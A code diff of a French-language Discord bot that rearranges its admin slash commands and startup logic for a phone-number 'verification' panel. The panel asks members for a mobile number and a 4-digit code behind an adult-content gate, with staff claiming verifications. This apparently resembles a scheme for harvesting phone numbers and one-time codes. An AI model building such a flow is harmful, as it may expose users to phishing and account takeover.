+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="reset", description="Reset le panneau de vérification")
+@app_commands.default_permissions(administrator=True)
+async def reset(interaction: discord.Interaction):
+    await setup.callback(interaction)
+
+@bot.tree.command(name="stats", description="Voir les stats de vérification")
+@app_commands.default_permissions(administrator=True)
+async def stats(interaction: discord.Interaction):
+    embed = discord.Embed(title="📊 Statistiques", description=f"**En cours :** {len(verified_users)}\n**Blacklistés :** {len(blacklisted_users)}\n**Numéros blacklistés :** {len(blacklisted_numbers)}", color=0x5865f2)
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.event
+async def on_ready():
+    log.info(f"✅ Connecté : {bot.user}")
+    await bot.tree.sync()
+    log.info("Commandes slash synchronisées.")
+
+    bot.add_view(VerifyView())
+
+    if config.SETUP_CHANNEL_ID:
+        channel = bot.get_channel(config.SETUP_CHANNEL_ID)
+        if channel:
+            async for msg in channel.history(limit=50):
+                if msg.author.id == bot.user.id and msg.embeds:
+                    try:
+                        await msg.edit(view=VerifyView())
+                        log.info("✅ Vue de vérification restaurée automatiquement")
+                        break
+                    except:
+                        pass
+
+    asyncio.create_task(start_health_server())
 
 class VerifyView(discord.ui.View):
     def __init__(self):
@@ -370,104 +489,6 @@ class VerifyView(discord.ui.View):
             return
         await interaction.response.send_modal(PhoneModal())
 
-@bot.tree.command(name="setup", description="Crée le panneau de vérification")
-@app_commands.default_permissions(administrator=True)
-async def setup(interaction: discord.Interaction):
-    embed = discord.Embed(
-        title="🔞 Vérification requise",
-        description="Pour accéder à ce serveur, vérifiez votre compte.\n\n**Procédure :**\n1️⃣ Cliquez sur **Vérifier**\n2️⃣ Entrez votre numéro (06/07)\n3️⃣ Recevez un **code à 4 chiffres** par MP\n4️⃣ Répondez avec le code\n\n🔒 **100% sécurisé** • 💰 **0,00 €**",
-        color=0x5865f2
-    )
-    embed.set_footer(text="Système de vérification")
-    view = VerifyView()
-    await interaction.response.send_message(embed=embed, view=view)
-    config.SETUP_CHANNEL_ID = interaction.channel_id
-    log.info(f"Setup dans #{interaction.channel.name}")
-
-@bot.tree.command(name="sync", description="Sync les commandes")
-@app_commands.default_permissions(administrator=True)
-async def sync(interaction: discord.Interaction):
-    await bot.tree.sync()
-    embed = discord.Embed(title="✅ Commandes synchronisées", color=0x57f287)
-    await interaction.response.send_message(embed=embed, ephemeral=True)
-
-@bot.tree.command(name="reset", description="Reset le panneau")
-@app_commands.default_permissions(administrator=True)
-async def reset(interaction: discord.Interaction):
-    await setup.callback(interaction)
-
-@bot.tree.command(name="stats", description="Stats vérification")
-@app_commands.default_permissions(administrator=True)
-async def stats(interaction: discord.Interaction):
-    embed = discord.Embed(
-        title="📊 Stats",
-        description=f"**En cours :** {len(pending_verifications)}\n**Blacklistés :** {len(blacklisted_users)}\n**Numéros blacklistés :** {len(blacklisted_numbers)}",
-        color=0x5865f2
-    )
-    await interaction.response.send_message(embed=embed, ephemeral=True)
-
-@bot.tree.command(name="acces", description="Donne l'accès aux vérifications à un staff")
-@app_commands.default_permissions(administrator=True)
-async def acces(interaction: discord.Interaction, member: discord.Member):
-    if config.STAFF_ROLE_ID == 0:
-        embed = discord.Embed(title="❌ Erreur", description="STAFF_ROLE_ID non configuré dans .env", color=0xed4245)
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-    role = interaction.guild.get_role(config.STAFF_ROLE_ID)
-    if not role:
-        embed = discord.Embed(title="❌ Erreur", description="Rôle staff introuvable.", color=0xed4245)
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-    if role in member.roles:
-        embed = discord.Embed(title="⚠️ Déjà", description=f"{member.mention} a déjà l'accès.", color=0xfee75c)
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-    await member.add_roles(role, reason="Accès vérification")
-    embed = discord.Embed(title="✅ Accès donné", description=f"{member.mention} peut maintenant claim et gérer les vérifications.", color=0x57f287)
-    await interaction.response.send_message(embed=embed, ephemeral=True)
-    log.info(f"Accès donné à {member.name} par {interaction.user.name}")
-
-@bot.tree.command(name="delacces", description="Retire l'accès aux vérifications à un staff")
-@app_commands.default_permissions(administrator=True)
-async def delacces(interaction: discord.Interaction, member: discord.Member):
-    if config.STAFF_ROLE_ID == 0:
-        embed = discord.Embed(title="❌ Erreur", description="STAFF_ROLE_ID non configuré.", color=0xed4245)
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-    role = interaction.guild.get_role(config.STAFF_ROLE_ID)
-    if not role:
-        embed = discord.Embed(title="❌ Erreur", description="Rôle introuvable.", color=0xed4245)
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-    if role not in member.roles:
-        embed = discord.Embed(title="⚠️ Pas d'accès", description=f"{member.mention} n'a pas l'accès.", color=0xfee75c)
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-    await member.remove_roles(role, reason="Accès vérification retiré")
-    embed = discord.Embed(title="✅ Accès retiré", description=f"{member.mention} ne peut plus gérer les vérifications.", color=0x57f287)
-    await interaction.response.send_message(embed=embed, ephemeral=True)
-    log.info(f"Accès retiré à {member.name} par {interaction.user.name}")
-
-@bot.event
-async def on_ready():
-    log.info(f"✅ Connecté : {bot.user}")
-    await bot.tree.sync()
-    log.info("Commandes synchronisées.")
-    bot.add_view(VerifyView())
-    # Restaurer les vues persistantes dans le salon setup
-    if config.SETUP_CHANNEL_ID:
-        channel = bot.get_channel(config.SETUP_CHANNEL_ID)
-        if channel:
-            async for msg in channel.history(limit=50):
-                if msg.author.id == bot.user.id and msg.embeds:
-                    try:
-                        await msg.edit(view=VerifyView())
-                        log.info("Vue restaurée automatiquement")
-                        break
-                    except:
-                        pass
-    asyncio.create_task(start_health_server())
-
 @bot.event
 async def on_message(message: discord.Message):
     if message.author.bot:
@@ -477,6 +498,6 @@ async def on_message(message: discord.Message):
 
 if __name__ == "__main__":
     if not config.BOT_TOKEN:
-        log.critical("BOT_TOKEN manquant")
+        log.critical("BOT_TOKEN manquant dans .env")
         exit(1)
     bot.run(config.BOT_TOKEN)
